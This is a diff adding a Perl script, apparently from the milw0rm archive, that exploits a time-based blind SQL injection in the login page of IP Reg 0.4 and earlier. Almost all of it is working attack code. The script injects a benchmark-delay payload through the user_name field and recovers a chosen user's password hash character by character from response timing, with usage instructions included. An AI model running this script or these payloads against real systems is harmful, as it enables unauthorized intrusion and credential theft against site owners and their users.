@@ -1,0 +1,91 @@
+#!/usr/bin/perl 
+# -----------------------------------------------
+# IP Reg <= 0.4 Blind SQL Injection Exploit
+# Discovered By StAkeR - StAkeR[at]hotmail[dot]it 
+# Discovered On 03/10/2008 
+# -----------------------------------------------
+# Download http://sourceforge.net/projects/ipreg/
+# -----------------------------------------------
+
+use strict;
+use LWP::UserAgent;
+
+my @chars = (48..57, 97..102); 
+my $start = undef;
+my $stop  = undef;
+my $hash  = undef;
+my $substr = 1; 
+my $http = new LWP::UserAgent;
+my ($domain,$userid) = @ARGV;
+
+usage() unless $domain =~ /^http:\/\/(.+?)$/i and $userid =~ /^[0-9]$/; 
+
+
+sub send_request
+{ 
+  my $post = undef;
+  my $host = $domain;
+  my $param = shift @_ or die $!;
+  
+  $host .= "/login.php";
+  $post = $http->post($host,[
+                             user_name => $param,
+                             user_pass => 'admin'
+                            ]);
+ 
+}
+
+
+sub give_char
+{
+  my $send = undef;
+  my ($charz,$uidz) = @_;
+  
+  $send = "' or (select if((ascii(substring".
+          "(user_pass,$uidz,1))=$charz),".
+          "benchmark(200000000,char(0)),".
+          "0) from user where user_id=$userid)#";
+
+  return $send;
+}
+
+
+for(0..32) 
+{
+  foreach my $set(@chars)
+  {
+    my $start = time();
+    
+    send_request(give_char($set,$substr));
+    
+    my $stop = time();
+  
+    if($stop - $start > 3)
+    { 
+      $hash .= chr($set);
+      $substr++ and last;
+    }
+  }
+}
+
+sub usage
+{
+  print "[?] IP Reg <= 0.4 (login.php) Blind SQL Injection Exploit\n";
+  print "[?] Exploit Coded By StAkeR - Benchmark Method\n";
+  print "[?] Usage: perl $0 http://[host] [id]\n";
+  exit;
+}
+
+
+if(defined $hash and $http->get($domain)->is_success)   
+{
+  print "[?] Hash: $hash\n";
+  exit;
+}
+else
+{
+  print "[?] Exploit Failed!\n";
+  exit;
+}
+
+# milw0rm.com [2008-10-03]
